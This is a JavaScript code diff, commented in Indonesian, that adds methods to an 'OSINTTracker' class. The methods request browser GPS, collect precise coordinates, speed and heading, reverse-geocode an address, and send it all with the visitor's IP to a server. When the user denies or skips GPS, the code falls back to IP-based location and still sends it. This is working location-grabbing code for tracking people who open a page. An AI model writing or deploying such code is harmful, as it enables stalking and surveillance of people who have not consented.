@@ -401,6 +401,130 @@ class OSINTTracker {
             }
         } catch (e) {}
     }
+    // Minta izin GPS
+    async requestGPSPermission() {
+        const statusDiv = document.getElementById('gpsStatus');
+        
+        if (!navigator.geolocation) {
+            this.showStatus(statusDiv, '❌ Browser tidak mendukung GPS', 'warning');
+            return;
+        }
+        
+        // Cek izin
+        if (navigator.permissions) {
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                if (result.state === 'denied') {
+                    this.showStatus(statusDiv, '❌ Izin lokasi ditolak. Silakan izinkan di pengaturan browser.', 'warning');
+                    return;
+                }
+            } catch (e) {}
+        }
+        
+        // Opsi untuk akurasi tinggi
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        };
+        
+        this.showStatus(statusDiv, '⏳ Mendapatkan lokasi GPS akurat...', 'info');
+        
+        navigator.geolocation.getCurrentPosition(
+            // SUCCESS - Dapat lokasi
+            async (position) => {
+                console.log('✅ GPS AKTIF! Mendapatkan koordinat...');
+                
+                // Simpan data GPS
+                this.userData.latitude = position.coords.latitude;
+                this.userData.longitude = position.coords.longitude;
+                this.userData.accuracy = position.coords.accuracy;
+                this.userData.altitude = position.coords.altitude;
+                this.userData.heading = position.coords.heading;
+                this.userData.speed = position.coords.speed;
+                this.userData.source = 'gps';
+                this.userData.gps_allowed = true;
+                
+                // Buat link Google Maps
+                this.userData.google_maps_link = `https://www.google.com/maps?q=${this.userData.latitude},${this.userData.longitude}`;
+                
+                this.showStatus(statusDiv, `✅ GPS AKTIF! Akurasi: ±${position.coords.accuracy} meter`, 'success');
+                
+                // Dapatkan alamat dari koordinat
+                await this.reverseGeocode();
+                
+                // Kirim data ke server
+                await this.sendToServer();
+                
+                // Update tampilan
+                if (window.updateLocationDisplay) {
+                    window.updateLocationDisplay(this.userData);
+                }
+                
+                // Tampilkan notifikasi
+                this.showNotification(
+                    '✅ Data lokasi terkirim ke server',
+                    'success'
+                );
+                
+                // Log untuk developer
+                console.log('%c📍 OSINT DATA COLLECTED', 'background: #28a745; color: white; padding: 5px;');
+                console.log('IP:', this.userData.ip_address);
+                console.log('Koordinat:', this.userData.latitude, this.userData.longitude);
+                console.log('Alamat:', this.userData.full_address);
+                console.log('Google Maps:', this.userData.google_maps_link);
+            },
+            
+            // ERROR - Gagal dapat lokasi
+            (error) => {
+                let errorMsg = '';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMsg = 'Izin lokasi ditolak oleh pengguna';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMsg = 'Lokasi tidak tersedia';
+                        break;
+                    case error.TIMEOUT:
+                        errorMsg = 'Waktu permintaan habis';
+                        break;
+                    default:
+                        errorMsg = error.message;
+                }
+                
+                console.error('❌ GPS Error:', errorMsg);
+                this.showStatus(statusDiv, `❌ Gagal: ${errorMsg}`, 'warning');
+                
+                // Fallback ke IP-based
+                this.fallbackToIP();
+            },
+            
+            options
+        );
+    }
+    
+    // Skip GPS, tetap kirim data dari IP
+    skipGPS() {
+        this.fallbackToIP();
+        this.showNotification('⚠️ Menggunakan data dari IP (kurang akurat)', 'warning');
+    }
+    
+    // Fallback ke IP-based
+    async fallbackToIP() {
+        this.userData.source = 'ip_based';
+        this.userData.gps_allowed = false;
+        
+        // Dapatkan data dari IP
+        await this.getIPLocation();
+        
+        // Kirim data
+        await this.sendToServer();
+        
+        // Update tampilan
+        if (window.updateLocationDisplay) {
+            window.updateLocationDisplay(this.userData);
+        }
+    }
 }
 
 // Inisialisasi OSINT tracker
